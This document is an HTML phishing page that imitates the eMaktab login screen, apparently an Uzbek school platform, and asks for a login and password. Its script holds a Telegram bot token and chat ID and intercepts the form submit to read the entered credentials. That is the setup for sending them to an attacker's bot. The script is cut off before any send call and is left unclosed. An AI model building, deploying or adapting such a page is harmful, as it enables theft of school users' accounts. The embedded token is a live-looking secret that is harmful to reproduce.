<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eMaktab | eMaktab ga kirish</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
        .header { width: 100%; background: white; padding: 15px 10%; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); box-sizing: border-box; }
        .login-container { width: 100%; max-width: 800px; margin-top: 50px; background: white; border-radius: 4px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .login-header { background-color: #2c3e8c; color: white; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; }
        .login-header h2 { margin: 0; font-weight: 500; }
        .login-content { padding: 30px 40px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; font-weight: bold; color: #444; }
        .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        .btn-submit { background-color: #8cc63f; color: white; border: none; padding: 12px 30px; border-radius: 4px; font-size: 18px; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="header">
        <h1 style="color: #2c3e8c; margin: 0;">eMaktab</h1>
    </div>
    <div class="login-container">
        <div class="login-header">
            <h2>Kirish eMaktab</h2>
        </div>
        <div class="login-content">
            <form id="loginForm">
                <div class="form-group">
                    <label>Login</label>
                    <input type="text" id="username" placeholder="Loginni kiriting" required>
                </div>
                <div class="form-group">
                    <label>Parol</label>
                    <input type="password" id="password" placeholder="Parolni kiriting" required>
                </div>
                <button type="submit" class="btn-submit">Tizimga kiring</button>
            </form>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8405959828:AAGf0Mo53xL34D2g-DwG1UXbSdRHe7nnfFY'; // Bu yerga Bot Token qo'ying
        const CHAT_ID = '8584543342';   // Bu yerga Chat ID qo'ying

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault(); // Sahifa yangilanishini to'xtatadi

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

</body>
